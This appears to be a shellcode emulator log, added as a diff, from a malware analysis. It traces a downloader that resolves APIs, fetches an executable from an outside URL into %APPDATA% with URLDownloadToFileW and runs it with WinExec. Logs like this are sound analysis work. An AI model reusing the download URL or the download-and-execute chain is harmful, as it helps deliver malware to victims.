@@ -1,0 +1,28 @@
+=======================================================================
+Found XOR 00 position 0002C760: GetEIP method 3 E996000000
+Found XOR 00 position 0002C912: GetEIP method 3 E9E4FEFFFF
+=======================================================================
+
+Max Steps: 2000000
+Using base offset: 0x401000
+Execution starts at file offset 2c760
+42d760  E996000000                      jmp 0x42d7fb  vv
+42d765  E9DB020000                      jmp 0x42da45  vv
+42d76a  EB0F                            jmp 0x42d77b  vv
+42d76c  EB03                            jmp 0x42d771  vv
+42d76e  83623DE9                        and dword [edx+0x3d],0xffffffe9
+
+
+42dae0  GetProcAddress(ExpandEnvironmentStringsW)
+42db15  ExpandEnvironmentStringsW(%APPDATA%\WRT.exe, dst=12fad8, sz=104)
+42db2a  LoadLibraryW(UrlMon)
+42db45  GetProcAddress(URLDownloadToFileW)
+42dbb9  URLDownloadToFileW(http://yatesassociates.co.za/documentato/MLY.exe, C:\Users\malware\AppData\Roaming\WRT.exe)
+42dbd5  GetProcAddress(WideCharToMultiByte)
+42dbf3  WideCharToMultiByte(0,0,in=12fad8,sz=ffffffff,out=12fcf4,sz=104,0,0) = 0
+42dc03  GetProcAddress(WinExec)
+42dc0f  WinExec()
+42dc23  GetProcAddress(ExitProcess)
+42dc27  ExitProcess(0)
+
+Stepcount 40909
